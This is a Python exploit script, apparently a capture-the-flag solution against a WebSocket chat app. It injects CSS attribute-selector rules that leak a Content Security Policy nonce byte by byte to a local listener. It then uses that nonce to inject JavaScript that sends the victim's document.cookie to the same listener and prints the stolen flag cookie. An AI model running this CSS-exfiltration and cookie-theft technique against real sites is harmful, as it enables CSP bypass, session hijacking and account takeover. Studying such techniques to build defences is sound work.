# from pwn import *
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from urllib.parse import unquote
import sys
import json
import threading

nonce = ""

from websocket import create_connection

ws = create_connection("ws://localhost:8080/%s" % sys.argv[1])

PORT_NUMBER = 9080
PUBURL = "http://localhost:9080/"

rules = {
    0: 'script{{display:inline-block;}}script[nonce^="{nonce}{char}"]{{background: url({puburl}{char});}}',
    1: 'body script[nonce^="{nonce}{char}"]{{background: url({puburl}{char});}}',
    2: 'html body script[nonce^="{nonce}{char}"]{{background: url({puburl}{char});}}',
    3: 'html body script[nonce^="{nonce}{char}"]{{background: url({puburl}{char}) !important;}}',
    4: 'script[nonce^="{nonce}{char}"]::after{{content: "pwn"; display: block; background: url({puburl}{char});}}',
    5: 'body script[nonce^="{nonce}{char}"]::after{{content: "pwn"; display: block; background: url({puburl}{char});}}',
    6: 'html body script[nonce^="{nonce}{char}"]::after{{content: "pwn"; display: block; background: url({puburl}{char});}}',
    7: 'html body script[nonce^="{nonce}{char}"]::after{{content: "pwn"; display: block; background: url({puburl}{char}) !important;}}',
    8: 'script[nonce^="{nonce}{char}"]::before{{content: "pwn"; display: block; background: url({puburl}{char});}}',
    9: 'body script[nonce^="{nonce}{char}"]::before{{content: "pwn"; display: block; background: url({puburl}{char});}}',
    10: 'html body script[nonce^="{nonce}{char}"]::before{{content: "pwn"; display: block; background: url({puburl}{char});}}',
    11: 'html body script[nonce^="{nonce}{char}"]::before{{content: "pwn"; display: block; background: url({puburl}{char}) !important;}}',
}


def make_rule(c):
    return rules[len(nonce) / 2].format(nonce=nonce, puburl=PUBURL + "nonce/", char=c)


def do_style():
    global nonce
    global ws
    if nonce == "":
        ws.send('{"username": "pwner", "type": "gabbr-join"}')
    alphabet = ["%02x" % i for i in range(256)]
    payload = json.dumps(
        {"type": "style", "content": "".join(map(make_rule, alphabet))}
    )
    ws.send(payload)


def do_js():
    global nonce
    global ws
    ws.send(
        json.dumps(
            {
                "type": "script",
                "nonce": nonce,
                "content": 'document.write(`<img src="{}flag/${{document.cookie}}">`);'.format(
                    PUBURL
                ),
            }
        )
    )


class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global nonce
        if self.path[:6] == "/flag/":
            cookie = unquote(self.path[6:])
            cookies = dict(map(lambda c: c.split("="), cookie.split("; ")))
            print(cookies["flag"])
            os._exit(0)
        if self.path[:7] == "/nonce/":
            nonce += self.path[7:]
        if len(nonce) < 24:
            do_style()
        else:
            # got the nonce, party!
            do_js()
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b"404")
        return

    def log_message(self, format, *args):
        pass


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    pass


server = ThreadedHTTPServer(("", PORT_NUMBER), myHandler)

t = threading.Thread(target=server.serve_forever)
t.start()

import time

time.sleep(1)
do_style()
